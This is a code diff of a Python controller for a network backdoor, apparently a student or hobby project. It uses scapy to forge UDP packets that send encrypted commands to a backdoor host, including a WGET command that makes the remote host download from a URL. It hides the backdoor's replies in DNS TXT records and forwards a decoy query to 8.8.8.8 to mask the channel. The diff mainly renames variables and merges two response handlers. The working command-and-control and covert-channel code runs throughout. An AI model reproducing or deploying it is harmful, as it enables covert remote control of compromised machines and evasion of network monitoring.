@@ -25,48 +25,51 @@ from scapy.all import IP, sr1, UDP, send, sniff, Raw, DNS
 
 
 # Command Line Arguments
-parser = argparse.ArgumentParser("./main.py")
-parser.add_argument("controller_ip", help="The IPv4 address of the controller host")
-parser.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
-parser.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
-args = parser.parse_args()
+PARSER = argparse.ArgumentParser("./main.py")
+PARSER.add_argument("controller_ip", help="The IPv4 address of the controller host")
+PARSER.add_argument("backdoor_ip", help="The IPv4 address of the backdoor host.")
+PARSER.add_argument("interface", help="The name of the Network Interface Device to listen on. i.e. wlo1, enp2s0, enp1s0")
+ARGS = PARSER.parse_args()
 
 
 # Validate Arguments
-if not validate_ipv4_address(args.controller_ip):
-    print(f"Invalid IPv4 Address: '{args.controller_ip}'")
+if not validate_ipv4_address(ARGS.controller_ip):
+    print(f"Invalid IPv4 Address: '{ARGS.controller_ip}'")
     exit(1)
 
-if not validate_ipv4_address(args.backdoor_ip):
-    print(f"Invalid IPv4 Address: '{args.backdoor_ip}'")
+if not validate_ipv4_address(ARGS.backdoor_ip):
+    print(f"Invalid IPv4 Address: '{ARGS.backdoor_ip}'")
     exit(1)
 
-if not validate_nic_interface(args.interface):
-    print(f"Network Interface does not exist: '{args.interface}'")
+if not validate_nic_interface(ARGS.interface):
+    print(f"Network Interface does not exist: '{ARGS.interface}'")
     exit(1)
 
 
 # Global Variables
-CONTROLLER_IP = args.controller_ip
-BACKDOOR_IP = args.backdoor_ip
-NETWORK_INTERFACE = args.interface
-queue = SimpleQueue()
-encryption_handler = StreamEncryption()
+CONTROLLER_IP = ARGS.controller_ip
+BACKDOOR_IP = ARGS.backdoor_ip
+NETWORK_INTERFACE = ARGS.interface
+QUEUE = SimpleQueue()
+ENCRYPTION_HANDLER = StreamEncryption()
 
 
 # Initialize the encryption context.
-encryption_handler.read_nonce("data/nonce.bin")
-encryption_handler.read_secret("data/secret.key")
-encryption_handler.initialize_encryption_context()
+ENCRYPTION_HANDLER.read_nonce("data/nonce.bin")
+ENCRYPTION_HANDLER.read_secret("data/secret.key")
+ENCRYPTION_HANDLER.initialize_encryption_context()
 
 
 def subprocess_packet_handler(pkt):
+    """
+    
+    """
     if pkt[UDP].sport != 53 or pkt[UDP].dport != 53:
         return None
     # 1. Get the data in the TXT record.
     encrypted_message = pkt[UDP].ar.rdata[0]
     # 2. Put the data in the queue.
-    queue.put(encrypted_message)
+    QUEUE.put(encrypted_message)
     # 3. Craft a legit query.
     forged = IP(dst="8.8.8.8")/UDP(sport=53, dport=53)/DNS(rd=1, qd=pkt[DNS].qd)
     # 4. sr1 the DNS query to a legit DNS server.
@@ -78,6 +81,8 @@ def subprocess_packet_handler(pkt):
 
 
 def subprocess_start():
+    """
+    """
     sniff(filter=f"ip src host {BACKDOOR_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=subprocess_packet_handler)
 
 
@@ -91,7 +96,7 @@ def send_udp(data: str):
     """
     data = data.encode("utf-8")
     # Encrypt the data.
-    data = encryption_handler.encrypt(data)
+    data = ENCRYPTION_HANDLER.encrypt(data)
     # Forge the UDP packet.
     pkt = IP(src=f"{CONTROLLER_IP}", dst=f"{BACKDOOR_IP}")/UDP(sport=10069, dport=10420, len=len(data))
     pkt[UDP].payload = Raw(data)
@@ -99,32 +104,15 @@ def send_udp(data: str):
     send(pkt, verbose=0)
 
 
-def handle_wget(data):
-    # 1. Send command
-    send_udp(data)
-    # 2. Receive response
+def receive_response():
     encrypted = None
     while True:
-        if queue.empty():
+        if QUEUE.empty():
             sleep(0.5)
             continue
-        encrypted = queue.get()
+        encrypted = QUEUE.get()
         break
-    decrypted = encryption_handler.decrypt(encrypted)
-    print(f"Response: {decrypted.decode('utf-8')}")
-
-
-def handle_list(data):
-    # Send the command to backdoor.
-    send_udp(data)
-    # Receive the response.
-    encrypted = None
-    while True:
-        if queue.empty():
-            continue
-        encrypted = queue.get()
-        break
-    decrypted = encryption_handler.decrypt(encrypted)
+    decrypted = ENCRYPTION_HANDLER.decrypt(encrypted)
     print(f"Response: {decrypted.decode('utf-8')}")
 
 
@@ -158,14 +146,16 @@ if __name__ == "__main__":
             if argv[0] == LIST:
                 file_path = argv[1]
                 data = argv[0] + " " + argv[1]
-                handle_list(data)
+                send_udp(data)
+                receive_response()
                 continue
         if argc == 3:
             if argv[0] == WGET:
                 url = argv[1]
                 filepath = argv[2]
                 data = argv[0] + " " + argv[1] + " " + argv[2]
-                handle_wget(data)
+                send_udp(data)
+                receive_response()
                 continue
         else:
             print(f"Command not found: {command}")
